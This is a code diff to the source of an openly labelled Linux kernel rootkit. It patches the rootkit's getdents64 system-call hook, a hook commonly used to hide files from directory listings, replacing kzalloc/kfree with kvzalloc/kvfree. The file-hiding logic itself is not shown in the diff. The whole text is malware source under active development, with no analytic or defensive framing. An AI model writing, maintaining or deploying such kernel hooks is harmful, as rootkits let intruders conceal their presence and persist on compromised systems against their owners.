@@ -2,8 +2,9 @@
 #include "macro_utils.h"
 #include "syscall_hooks.h"
 #include "utils.h"
+#include <linux/err.h>
+#include <linux/mm.h>
 #include <linux/printk.h>
-#include <linux/slab.h>
 #include <linux/string.h>
 #include <linux/types.h>
 #include <linux/uaccess.h>
@@ -60,7 +61,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
         return l_ret_orig;
     }
 
-    p_dirent_k = kzalloc(l_ret_orig, GFP_KERNEL);
+    p_dirent_k = kvzalloc(l_ret_orig, GFP_KERNEL);
 
     IF_U (p_dirent_k == NULL) {
         pr_err("[ROOTKIT] * Could not allocate memory\n");
@@ -72,7 +73,7 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
 
     IF_U (l_err != 0) {
         pr_err("[ROOTKIT] * Could not copy data from user\n");
-        kfree(p_dirent_k);
+        kvfree(p_dirent_k);
         return l_ret_orig;
     }
 
@@ -129,6 +130,6 @@ SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd
         pr_err("[ROOTKIT] * Could not copy data back to user\n");
     }
 
-    kfree(p_dirent_k);
+    kvfree(p_dirent_k);
     return l_ret;
 }
